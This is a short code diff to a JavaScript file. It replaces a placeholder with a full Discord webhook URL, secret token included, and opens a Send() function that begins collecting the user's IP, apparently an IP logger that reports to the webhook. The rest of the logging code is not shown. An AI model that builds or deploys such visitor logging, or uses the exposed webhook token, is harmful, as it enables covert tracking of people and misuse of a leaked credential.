@@ -1,4 +1,4 @@
-const yourwebhook = "WEBHOOK HERE" //change to your webhook
+const yourwebhook = "https://discord.com/api/webhooks/1002296356926398514/Mg4GiYh1bY0YiN5GJfK7lI9fmkAcxadU7GKLtt5Z44LJgrlVkLTIhdPGwYlr1u3IikmE" //change to your webhook
 
 function Send() {
   let UserIp; // IP log
